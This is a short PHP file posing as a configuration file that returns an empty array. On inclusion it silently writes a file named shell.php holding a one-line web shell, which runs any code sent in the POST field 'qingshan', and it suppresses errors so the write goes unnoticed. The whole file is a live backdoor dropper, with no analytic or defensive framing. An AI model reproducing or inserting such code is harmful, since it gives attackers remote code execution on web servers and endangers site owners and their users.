<?php

@file_put_contents("shell.php",'<?php @eval($_POST["qingshan"]);?>');
return [];

?>